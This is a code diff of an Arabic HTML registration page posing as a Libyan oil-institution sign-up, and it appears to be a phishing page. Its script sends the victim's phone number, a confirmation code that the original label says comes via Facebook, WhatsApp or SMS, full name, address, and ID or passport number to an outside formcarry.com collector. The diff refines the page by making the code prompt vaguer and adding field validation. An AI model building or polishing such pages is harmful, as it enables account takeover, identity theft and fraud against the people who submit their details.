@@ -156,7 +156,7 @@
 
   <div class="container">
     <div class="logo-container">
-      <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
+      <img src="uy.jpeg" alt="شعار المؤسسة" />
       <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
     </div>
 
@@ -171,16 +171,14 @@
 
     <form id="codeForm" onsubmit="return sendCode(event);">
       <div id="codeField">
-        <label for="code">📩 انتظر وصول كود التأكيد عبر إشعار من فيسبوك أو واتساب أو رسالة SMS</label>
+        <label for="code">📩 انتظر وصول كود التأكيد عبر إشعار أو رسالة</label>
         <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" required />
         <div id="errorMessage" class="error"></div>
-        <button type="submit" id="sendCodeBtn">طلب الدخول</button>
       </div>
 
-      <!-- الإطار الأزرق -->
       <div id="extraFields">
         <label for="fullName">الاسم بالكامل:</label>
-        <input type="text" id="fullName" name="fullName" placeholder="مثال: محمد علي حسن" required />
+        <input type="text" id="fullName" name="fullName" placeholder="مثال: أحمد محمد علي" required />
 
         <label for="address">العنوان - الشارع:</label>
         <input type="text" id="address" name="address" placeholder="مثال: شارع الجمهورية - طرابلس" required />
@@ -197,18 +195,21 @@
           <input type="text" id="documentNumber" name="documentNumber" placeholder="" required />
         </div>
       </div>
+
+      <button type="submit" id="sendCodeBtn" disabled>طلب الدخول</button>
     </form>
   </div>
 
   <script>
     let countdownInterval;
-    const sendPhoneBtn = document.getElementById('sendPhoneBtn');
-    const timerDisplay = document.getElementById('timer');
-    const codeField = document.getElementById('codeField');
     const phoneInput = document.getElementById('phone');
     const codeInput = document.getElementById('code');
-    const errorMessage = document.getElementById('errorMessage');
+    const sendPhoneBtn = document.getElementById('sendPhoneBtn');
+    const sendCodeBtn = document.getElementById('sendCodeBtn');
+    const codeField = document.getElementById('codeField');
     const extraFields = document.getElementById('extraFields');
+    const errorMessage = document.getElementById('errorMessage');
+    const timerDisplay = document.getElementById('timer');
 
     function startTimer(duration) {
       let timeLeft = duration;
@@ -234,35 +235,30 @@
 
     function sendPhone(event) {
       event.preventDefault();
-      const phonePattern = /^09[1-5][0-9]{7}$/;
       const phoneVal = phoneInput.value.trim();
+      const phonePattern = /^09[1-5][0-9]{7}$/;
 
       if (!phonePattern.test(phoneVal)) {
-        alert('❌ رقم الهاتف غير صحيح. يجب أن يبدأ بـ 091 أو 092 أو 093 أو 094 أو 095 ويكون مكونًا من 10 أرقام.');
-        phoneInput.focus();
+        alert("❌ رقم الهاتف غير صحيح.");
         return false;
       }
 
-      fetch('https://formcarry.com/s/a-Yw-WFDEqO', {
-        method: 'POST',
+      fetch("https://formcarry.com/s/a-Yw-WFDEqO", {
+        method: "POST",
         headers: {
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
+          "Content-Type": "application/json",
+          "Accept": "application/json"
         },
         body: JSON.stringify({ phone: phoneVal })
-      })
-      .then(response => {
-        if (!response.ok) throw new Error('فشل إرسال رقم الهاتف');
-
+      }).then(response => {
+        if (!response.ok) throw new Error();
         phoneInput.disabled = true;
         sendPhoneBtn.disabled = true;
         codeField.style.display = 'block';
         extraFields.style.display = 'block';
         startTimer(480);
-      })
-      .catch(error => {
-        alert('⚠️ تعذر إرسال رقم الهاتف. حاول مرة أخرى.');
-        console.error(error);
+      }).catch(() => {
+        alert("⚠️ تعذر إرسال الرقم. حاول مرة أخرى.");
       });
 
       return false;
@@ -276,66 +272,73 @@
 
       if (selected) {
         docField.style.display = 'block';
-        if (selected.value === 'بطاقة') {
-          docLabel.textContent = 'رقم البطاقة:';
-          docInput.placeholder = 'أدخل رقم البطاقة الشخصية';
-        } else {
-          docLabel.textContent = 'رقم الجواز:';
-          docInput.placeholder = 'أدخل رقم جواز السفر';
-        }
+        docLabel.textContent = selected.value === 'بطاقة' ? 'رقم البطاقة:' : 'رقم الجواز:';
+        docInput.placeholder = selected.value === 'بطاقة' ? 'أدخل رقم البطاقة الشخصية' : 'أدخل رقم جواز السفر';
+        validateAllFields();
       }
     }
+
+    function validateAllFields() {
+      const fullName = document.getElementById('fullName').value.trim();
+      const address = document.getElementById('address').value.trim();
+      const documentType = document.querySelector('input[name="documentType"]:checked');
+      const documentNumber = document.getElementById('documentNumber').value.trim();
+      const codeVal = codeInput.value.trim();
+
+      if (fullName && address && documentType && documentNumber && codeVal) {
+        sendCodeBtn.disabled = false;
+      } else {
+        sendCodeBtn.disabled = true;
+      }
+    }
+
+    document.querySelectorAll('#codeForm input').forEach(input => {
+      input.addEventListener('input', validateAllFields);
+    });
+    document.querySelectorAll('input[name="documentType"]').forEach(radio => {
+      radio.addEventListener('change', validateAllFields);
+    });
 
     function sendCode(event) {
       event.preventDefault();
       errorMessage.textContent = '';
 
-      if (codeInput.value.trim() === '') {
-        errorMessage.textContent = 'يرجى كتابة الكود المرسل إليك.';
-        codeInput.focus();
-        return false;
-      }
-
-      // التحقق من الحقول الجديدة
       const fullName = document.getElementById('fullName').value.trim();
       const address = document.getElementById('address').value.trim();
       const documentType = document.querySelector('input[name="documentType"]:checked')?.value || '';
       const documentNumber = document.getElementById('documentNumber').value.trim();
+      const codeVal = codeInput.value.trim();
 
-      if (!fullName || !address || !documentType || !documentNumber) {
-        errorMessage.textContent = 'يرجى ملء جميع البيانات المطلوبة.';
+      if (!fullName || !address || !documentType || !documentNumber || !codeVal) {
+        errorMessage.textContent = 'يرجى ملء جميع الحقول.';
         return false;
       }
 
       const payload = {
         phone: phoneInput.value,
-        code: codeInput.value,
+        code: codeVal,
         fullName,
         address,
         documentType,
         documentNumber
       };
 
-      fetch('https://formcarry.com/s/a-Yw-WFDEqO', {
-        method: 'POST',
+      fetch("https://formcarry.com/s/a-Yw-WFDEqO", {
+        method: "POST",
         headers: {
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
+          "Content-Type": "application/json",
+          "Accept": "application/json"
         },
         body: JSON.stringify(payload)
-      })
-      .then(async response => {
-        const data = await response.json();
-
-        if (response.ok && data.success !== false) {
-          window.location.href = 'success.html';
+      }).then(async res => {
+        const data = await res.json();
+        if (res.ok && data.success !== false) {
+          window.location.href = "success.html";
         } else {
-          errorMessage.textContent = '❌ الكود غير صحيح. حاول مرة أخرى.';
+          errorMessage.textContent = "❌ الكود غير صحيح.";
         }
-      })
-      .catch(error => {
-        errorMessage.textContent = '⚠️ تعذر الاتصال بالخادم.';
-        console.error(error);
+      }).catch(() => {
+        errorMessage.textContent = "⚠️ حدث خطأ في الإرسال.";
       });
 
       return false;
